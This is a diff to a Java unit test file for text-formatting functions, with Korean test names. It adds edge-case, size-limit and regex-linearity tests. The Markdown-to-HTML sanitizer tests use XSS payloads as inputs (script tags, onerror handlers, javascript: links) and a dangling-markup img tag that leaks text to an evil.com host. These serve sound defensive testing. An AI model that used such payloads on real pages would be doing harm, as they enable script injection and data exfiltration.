@@ -13,6 +13,8 @@ import java.util.concurrent.TimeUnit;
 import org.junit.jupiter.api.DisplayName;
 import org.junit.jupiter.api.Test;
 import org.junit.jupiter.api.Timeout;
+import org.jsoup.Jsoup;
+import org.jsoup.nodes.Document;
 
 class TextFormatsTest {
 
@@ -49,9 +51,18 @@ class TextFormatsTest {
         assertThat(out("text_replace", "input", "a b", "find", "[:space:]", "replace", "_")).isEqualTo("a_b");
         assertThat(out("text_replace", "input", "a b", "find", "[:space:]")).isEqualTo("ab");
         assertThat(out("text_replace", "input", "a.b", "find", ".", "replace", "-")).isEqualTo("a-b");
+        assertThat(out("text_replace", "input", "a\nb\tc", "find", "[:newline:]", "replace", "[:tab:]")).isEqualTo("a\tb\tc");
         assertThatThrownBy(() -> out("text_replace", "input", "a", "find", ""))
             .isInstanceOf(FormatterFailure.class)
             .hasMessageContaining("찾아 바꾸기:");
+    }
+
+    @Test
+    @DisplayName("text_replace: 결과가 10만 자를 넘으면 만들기 전에 실패한다")
+    void replaceResultOverLimitFails() {
+        assertThatThrownBy(() -> out("text_replace", "input", "a".repeat(50_000), "find", "a", "replace", "b".repeat(50_000)))
+            .isInstanceOf(FormatterFailure.class)
+            .hasMessageContaining("10만 자");
     }
 
     @Test
@@ -61,6 +72,8 @@ class TextFormatsTest {
         assertThat(out("text_truncate", "input", "가나다라", "maxLength", 3, "ellipsis", true)).isEqualTo("가나…");
         assertThat(out("text_truncate", "input", "가나", "maxLength", 3, "ellipsis", true)).isEqualTo("가나");
         assertThatThrownBy(() -> out("text_truncate", "input", "abc", "maxLength", 0))
+            .isInstanceOf(FormatterFailure.class);
+        assertThatThrownBy(() -> out("text_truncate", "input", "abc", "maxLength", "abc"))
             .isInstanceOf(FormatterFailure.class);
     }
 
@@ -72,6 +85,7 @@ class TextFormatsTest {
         assertThat(out("text_split", "input", "a, b ,c", "part", "last")).isEqualTo("c");
         assertThat(out("text_split", "input", "a, b ,c", "part", "all")).isEqualTo(List.of("a", "b", "c"));
         assertThat(out("text_split", "input", "a", "part", "second")).isEqualTo("");
+        assertThat(out("text_split", "input", "a,b")).isEqualTo("a");
         assertThat(out("text_split", "input", "a|b", "separator", "|", "part", "last")).isEqualTo("b");
     }
 
@@ -102,6 +116,38 @@ class TextFormatsTest {
         assertThat(out("text_extract", "input", "없음", "kind", "email", "all", true)).isEqualTo(List.of());
         assertThatThrownBy(() -> out("text_extract", "input", "a"))
             .isInstanceOf(FormatterFailure.class);
+    }
+
+    @Test
+    @DisplayName("text_extract phone: 카드·계좌번호 블록은 뽑지 않고 +82·괄호 지역번호는 원문 그대로")
+    void extractPhoneBoundaries() {
+        assertThat(out("text_extract", "input", "결제카드 4579-1723-4567-8901 승인", "kind", "phone", "all", true))
+            .isEqualTo(List.of());
+        assertThat(out("text_extract", "input", "카드 4579-010-1234-5678", "kind", "phone", "all", true))
+            .isEqualTo(List.of());
+        assertThat(out("text_extract", "input", "계좌 110-012-3456-7890", "kind", "phone", "all", true))
+            .isEqualTo(List.of());
+        assertThat(out("text_extract", "input", "+82 010-1234-5678", "kind", "phone")).isEqualTo("+82 010-1234-5678");
+        assertThat(out("text_extract", "input", "02) 345-6789", "kind", "phone")).isEqualTo("02) 345-6789");
+    }
+
+    @Test
+    @DisplayName("text_extract url: 짝 없는 닫는 괄호·뒤 조사는 떼고, 짝 있는 괄호는 두고, 호스트 없으면 버린다")
+    void extractUrlBrackets() {
+        assertThat(out("text_extract", "input", "홈페이지(https://ex.com/a)를 참고", "kind", "url")).isEqualTo("https://ex.com/a");
+        assertThat(out("text_extract", "input", "[여기](https://ex.com/a)에서", "kind", "url")).isEqualTo("https://ex.com/a");
+        assertThat(out("text_extract", "input", "https://en.wikipedia.org/wiki/Java_(programming_language)", "kind", "url"))
+            .isEqualTo("https://en.wikipedia.org/wiki/Java_(programming_language)");
+        assertThat(out("text_extract", "input", "https://...", "kind", "url")).isEqualTo("");
+    }
+
+    @Test
+    @Timeout(value = 5, unit = TimeUnit.SECONDS)
+    @DisplayName("text_extract email: 긴 반복 입력도 선형으로 끝나 빈 결과")
+    void extractEmailLinear() {
+        assertThat(out("text_extract", "input", "a".repeat(90_000), "kind", "email", "all", true)).isEqualTo(List.of());
+        assertThat(out("text_extract", "input", "a@" + "a.".repeat(44_990), "kind", "email", "all", true))
+            .isEqualTo(List.of());
     }
 
     @Test
@@ -142,18 +188,31 @@ class TextFormatsTest {
         assertThat(out("text_strip_html", "input",
             "<p>안녕 &amp; <b>반가워</b></p><script>alert(1)</script><p>둘째</p>")).isEqualTo("안녕 & 반가워\n둘째");
         assertThat(out("text_strip_html", "input", "a<br>b")).isEqualTo("a\nb");
+        assertThat(out("text_strip_html", "input", "<style>p{color:red}</style><p>본문</p>")).isEqualTo("본문");
     }
 
     @Test
-    @DisplayName("text_markdown_to_html: XSS는 제거하고 Markdown은 렌더한다")
+    @DisplayName("text_markdown_to_html: 실행 가능한 HTML은 남지 않고 Markdown은 렌더한다")
     void markdownToHtmlRemovesXss() {
         String html = (String) out("text_markdown_to_html", "input",
             "**굵게** <script>alert(1)</script> <img src=x onerror=alert(1)> [x](javascript:alert(1))");
-        assertThat(html).contains("<strong>굵게</strong>")
-            .doesNotContain("<script").doesNotContain("onerror").doesNotContain("javascript:");
+        assertThat(html).contains("<strong>굵게</strong>");
+        assertNoExecutableHtml(html);
+
+        String dangling = (String) out("text_markdown_to_html", "input",
+            "<div><img src='https://evil.com/leak?x=\n비밀\n'></div>");
+        assertNoExecutableHtml(dangling);
 
         String doc = (String) out("text_markdown_to_html", "input", "# 제목\n- a");
         assertThat(doc).contains("<h1>제목</h1>").contains("<li>a</li>");
+    }
+
+    private static void assertNoExecutableHtml(String html) {
+        Document doc = Jsoup.parseBodyFragment(html);
+        assertThat(doc.select("script")).isEmpty();
+        assertThat(doc.select("[onerror], [onload]")).isEmpty();
+        assertThat(doc.select("img")).isEmpty();
+        assertThat(doc.select("[href^=javascript:]")).isEmpty();
     }
 
     @Test
@@ -182,7 +241,7 @@ class TextFormatsTest {
         assertThat(out("text_replace", "input", "", "find", "a")).isEqualTo("");
         assertThat(out("text_truncate", "input", "", "maxLength", 3)).isEqualTo("");
         assertThat(out("text_split", "input", "")).isEqualTo("");
-        assertThat(out("text_split", "input", "", "part", "all")).isEqualTo(List.of(""));
+        assertThat(out("text_split", "input", "", "part", "all")).isEqualTo(List.of());
         assertThat(out("text_default", "input", "", "defaultValue", "d")).isEqualTo("d");
         assertThat(out("text_extract", "input", "", "kind", "email")).isEqualTo("");
         assertThat(out("text_extract", "input", "", "kind", "email", "all", true)).isEqualTo(List.of());
